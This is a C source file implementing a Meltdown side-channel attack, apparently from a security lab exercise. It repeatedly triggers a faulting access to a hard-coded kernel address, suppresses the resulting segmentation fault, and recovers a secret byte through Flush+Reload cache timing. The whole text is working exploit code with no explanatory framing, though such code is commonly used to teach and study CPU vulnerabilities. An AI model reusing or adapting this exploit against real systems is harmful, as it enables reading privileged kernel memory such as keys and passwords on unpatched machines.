static int scores[256];
void reloadSideChannelImproved()
{
	int i;
	volatile uint8_t *addr;
	register uint64_t time1, time2;
	int junk = 0;
	
	for (i = 0; i < 256; i++)
	{
		addr  = &array[i	* 4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk  = *addr;
		time2 = __rdtscp(&junk) - time1;

		if (time2 <= CACHE_HIT_THRESHOLD)
			scores[i]++; // if cache hit, add 1
	}
}

// Signal handler
static sigjmp_buf jbuf;
static void catch_segv()
{
	siglongjmp(jbuf, 1);
}

int main(int argc, char**argv)
{
	int i, j, ret = 0;
	
	// Register signal handler
	signal(SIGSEGV, catch_segv);
	
	int fd = open("/proc/secret_data", O_RDONLY);	
	if (fd < 0) 
	{
		perror("open");
		return -1;
	}
	
	memset(scores, 0, sizeof(scores));
	flushSideChannel();

	// Retry 1000 times on the same address.
	for (i = 0; i < 1000; i++)
	{
		ret = pread(fd, NULL, 0, 0);
		if (ret < 0)
		{
			perror("pread");
			break;
		}
		
		// Flush the probing array
		for (j = 0; j < 256; j++) _mm_clflush(&array[j*4096 + DELTA]);
			
		if (sigsetjmp(jbuf, 1) == 0) meltdown_asm(0xfb61b000);
		
		reloadSideChannelImproved();
	}
	
	// Find the index with the highest score.
	int max = 0;
	for (i = 0; i < 256; i++)
	{
		if (scores[max] < scores[i]) max = i;
	}
	
	printf("The secret value is %d %c\n", max, max);
	printf("The number of hits is %d\n", scores[max]);

	return 0;
}
